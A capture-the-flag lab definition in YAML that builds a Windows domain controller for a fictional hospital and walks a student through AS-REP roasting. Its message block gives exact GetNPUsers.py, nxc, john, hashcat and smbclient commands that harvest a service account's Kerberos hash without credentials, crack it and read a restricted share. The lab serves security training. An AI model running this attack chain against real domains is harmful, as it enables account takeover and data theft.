# yaml-language-server: $schema=https://www.isoloom.com/schema/v1.json
# AS-REP roasting as an Isoloom lab on a real Windows Server Active Directory domain controller.
# `dc` is the first (and only) DC of a new forest LAKESIDE.LAB (Lakeside Regional Hospital, a
# healthcare provider). Windows has no container form in Isoloom 1.0, so this is a VM lab:
# `isoloom generate vagrant` boots the Windows Server 2019 VM and sets it up from Isoloom's Ansible
# controller over WinRM (provision/ad-domain.yml promotes the forest and creates the principals);
# `isoloom generate docker` is refused.
#
# A legacy document-scanner service account (svc-scanner) has Kerberos pre-authentication disabled
# (userAccountControl bit DONT_REQ_PREAUTH) and a weak, wordlist-crackable password. An `imaging`
# share only svc-scanner may read holds the flag. With nothing but a username list and no
# credentials, the student AS-REP roasts svc-scanner, cracks the $krb5asrep$ hash offline, and
# reads the flag. A real Windows KDC honours DONT_REQ_PREAUTH and, with RC4 still enabled by
# default, hands back an RC4-HMAC AS-REP -- crackable with both john (--format=krb5asrep) and
# hashcat (-m 18200).
version: 1

name: asrep-roast-lakeside

# Given by the CyberCTF launcher: this player's flag. Without it the development flag.
inputs: [CTF_FLAG_MAIN]

networks:
  lab: { cidr: 10.30.10.0/24 }

machines:
  dc:
    os: windows-server@2019
    networks: { lab: 10 }
    aliases: [dc.lakeside.lab, lakeside.lab]
    resources: { cpus: 2, memory_mb: 4096, disk_gb: 60 }
    ports:
      dns: 53
      dns-udp:      { port: 53,  protocol: udp }
      kerberos: 88
      kerberos-udp: { port: 88,  protocol: udp }
      ldap: 389
      smb: 445
      kpasswd: 464
      gc: 3268
    # The flag arrives as a file before the domain is set up (Isoloom's sensitive-input mechanism);
    # provision/ad-domain.yml copies C:\ctf\flag.txt into the imaging share only svc-scanner reads.
    files:
      - { path: 'C:\ctf\flag.txt', input: CTF_FLAG_MAIN }

# The domain is set up from Isoloom's Ansible controller, which reaches the Windows DC over WinRM.
# A Windows machine's reboot (here, the forest promotion) is driven by the controller playbooks
# (microsoft.ad.domain reboot: true), not by a per-machine `reboot` step. provision/files holds the
# PowerShell the playbook runs on the DC.
provision:
  - ansible: provision/ad-domain.yml

checks:
  - checks/dc-answers.sh

message: |
  # AS-REP Roasting — Lakeside Regional Hospital (LAKESIDE.LAB)

  **Lakeside Regional Hospital** runs its network on a single Windows Server Active Directory
  Domain Controller for the realm **LAKESIDE.LAB**:

  - **DC:** `dc.lakeside.lab` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389, SMB 445).
  - You have only a list of likely usernames (no credentials):
    `j.okoro`, `a.mensah`, `r.kaplan`, `d.ferreira`, `l.nguyen`, `svc-scanner`.

  **Objective:** a legacy document-scanner service account has **Kerberos pre-authentication
  disabled** (`userAccountControl` bit `DONT_REQ_PREAUTH`). The AS-REP for such an account — the
  KDC reply encrypted with the account's own key — is the crackable material of an AS-REP roast.
  Recover that account's password and use it to read the flag from a share you cannot otherwise
  open.

  Point your attack box's resolver and `/etc/krb5.conf` at the DC, then:

  1. **AS-REP roast the username list (no credentials):**
     `GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip {{ machines.dc.addresses.lab }} -format john`
     (or `nxc ldap {{ machines.dc.addresses.lab }} -u users.txt -p '' --asreproast out.txt`)
     → only `svc-scanner`, the pre-auth-disabled account, returns a `$krb5asrep$...` hash; the
     ordinary staff accounts are refused. Windows keeps RC4 on by default, so the hash is RC4-HMAC
     (`$krb5asrep$svc-scanner@LAKESIDE.LAB:...`, no etype number).
  2. **Crack it** (the password is a weak word built from the scanner service's name and a year):
     `john --format=krb5asrep --wordlist=rockyou.txt asrep.hash` takes the hash as emitted; or
     `hashcat -m 18200`, inserting `23$` after `$krb5asrep$` (→ `$krb5asrep$23$svc-scanner@...`).
  3. **Loot the flag:** `smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'`.

  Submit the contents of `flag.txt`.
